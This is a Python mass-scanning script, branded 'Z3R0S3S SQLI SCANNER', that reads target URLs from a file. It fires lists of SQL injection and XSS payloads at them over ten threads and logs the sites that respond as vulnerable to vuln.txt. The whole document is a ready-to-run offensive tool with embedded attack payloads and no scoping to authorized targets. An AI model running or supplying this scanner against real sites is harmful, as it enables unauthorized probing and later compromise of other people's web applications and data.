import requests
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init
import sys
import signal

# Inisialisasi colorama
init(autoreset=True)

# List of SQL injection payloads
sql_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR '1'='1' #",
    "' OR ''='",
    "' OR 1 -- -",
    "' OR 1 /*",
    "' OR 1 #",
    "' OR 'a'='a",
    "' OR 'a'='a' --",
    "' OR 'a'='a' /*",
    "' OR 'a'='a' #",
    "' OR 1=1",
    "' OR 1=1 --",
    "' OR 1=1 /*",
    "' OR 1=1 #",
    "' OR '1'='1'--",
    "' OR '1'='1'/*",
    "' OR '1'='1'#",
]

# List of XSS payloads
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "<input type=text onfocus=alert('XSS')>",
    "<a href=javascript:alert('XSS')>Click me</a>",
    "<div onmouseover=alert('XSS')>Hover me</div>",
    "<form action=javascript:alert('XSS')><input type=submit></form>",
    "<object data=javascript:alert('XSS')></object>",
]

# Function to read URLs from a file and remove duplicates
def read_urls_from_file(file_path):
    try:
        with open(file_path, 'r') as file:
            urls = file.readlines()
        # Remove whitespace and duplicates
        urls = list(set(url.strip() for url in urls))
        return urls
    except FileNotFoundError:
        print(f"{Fore.RED}File '{file_path}' not found.{Style.RESET_ALL}")
        sys.exit(1)

# Function to check for SQL injection vulnerability
def is_vulnerable_sql(url):
    for payload in sql_payloads:
        target_url = url + payload
        try:
            response = requests.get(target_url, timeout=5)
            if "SQL syntax" in response.text or "mysql_fetch" in response.text or "SQL error" in response.text:
                print(f"{Fore.YELLOW}[+] SQL Injection Vulnerable: {url} with payload: {payload}{Style.RESET_ALL}")
                with open("vuln.txt", "a") as file:
                    file.write(f"{url}\n")
                return True
        except requests.RequestException as e:
            print(f"{Fore.RED}[-] Not vulnerable: {url}{Style.RESET_ALL}")
    return False

# Function to check for XSS vulnerability
def is_vulnerable_xss(url):
    for payload in xss_payloads:
        target_url = url + payload
        try:
            response = requests.get(target_url, timeout=5)
            if payload in response.text:
                print(f"{Fore.YELLOW}[+] XSS Vulnerable: {url} with payload: {payload}{Style.RESET_ALL}")
                with open("vuln.txt", "a") as file:
                    file.write(f"{url}\n")
                return True
        except requests.RequestException as e:
            print(f"{Fore.RED}[-] Not vulnerable: {url}{Style.RESET_ALL}")
    return False

# Main scanning function with threading
def scan_urls(urls):
    def scan(url):
        print(f"[*] Scanning: {url}")
        if is_vulnerable_sql(url):
            print(f"{Fore.YELLOW}[+] SQL Injection Vulnerable: {url}{Style.RESET_ALL}")
        elif is_vulnerable_xss(url):
            print(f"{Fore.YELLOW}[+] XSS Vulnerable: {url}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] Not vulnerable: {url}{Style.RESET_ALL}")

    with ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(scan, urls)

# Handle keyboard interrupt (CTRL+C)
def signal_handler(sig, frame):
    print("\nScan interrupted. Exiting...")
    sys.exit(0)

# Run the scanner
if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)  # Handle CTRL+C
    print(f"{Fore.BLUE}╔═══ Z3R0S3S ═══════════")
    print("  SQLI SCANNER")
    print(Style.RESET_ALL)
    file_path = input("Enter the path to the file containing URLs: ").strip()
    urls = read_urls_from_file(file_path)
    scan_urls(urls)
